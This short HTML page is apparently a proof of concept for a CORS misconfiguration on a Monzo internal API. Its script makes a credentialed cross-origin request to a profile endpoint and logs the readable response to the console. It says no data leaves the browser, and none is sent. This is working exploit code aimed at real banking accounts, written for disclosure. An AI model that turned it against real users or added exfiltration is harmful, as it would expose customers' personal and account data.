<!DOCTYPE html>
<html>
<body>
<h1>Monzo CORS Demonstration (Safe PoC)</h1>
<p>Open your browser console to see the response.</p>

<script>
/*
  SAFE PoC â€” Only works on your own account.
  No data is sent anywhere.
*/
fetch("https://internal-api.monzo.com/signup/profile", {
    method: "GET",
    credentials: "include"
})
.then(r => r.text())
.then(data => {
    console.log("Cross-origin readable response:", data);
})
.catch(e => console.error("Error:", e));
</script>

</body>
</html>
